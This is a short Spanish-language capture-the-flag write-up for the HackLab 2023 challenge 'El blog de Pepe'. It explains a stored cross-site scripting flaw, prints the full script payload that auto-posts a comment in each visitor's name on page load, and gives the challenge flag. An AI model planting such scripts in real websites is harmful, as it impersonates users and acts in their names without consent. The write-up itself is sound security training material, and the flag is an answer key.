# Desafío 7 - El blog de Pepe (HackLab 2023)

## Análisis

Se inyecta un comentario malicioso que contiene un `<script>` capaz de publicar un comentario en nombre del usuario que visita la página (excepto si es el propio autor).

## Explotación

Se envía el siguiente payload como comentario:

```html
Hola, dejo comentario malicioso
<script>

function enviarComentario() {
    var usuario = document.getElementById("nombre_usuario").innerText;
    if (usuario != "teny") {
        document.getElementsByName("txtComentario")[0].value = "Voy a derogar la ley 1542-A";
        document.getElementsByName("btnEnviar")[0].click();
    } else {
        console.log("Soy teny y no envio el comentario");
    }
}

window.addEventListener("load", enviarComentario);
</script>
```

Cuando cualquier usuario (que no sea `teny`) carga la página, el script se ejecuta automáticamente y publica el comentario `"Voy a derogar la ley 1542-A"` en su nombre.

![Desafío 7 - El blog de Pepe (HackLab 2023) - imagen 1](images/01.png)

## Flag

```
c4c309a13c8fc4c5f48e72e4154dc812
```
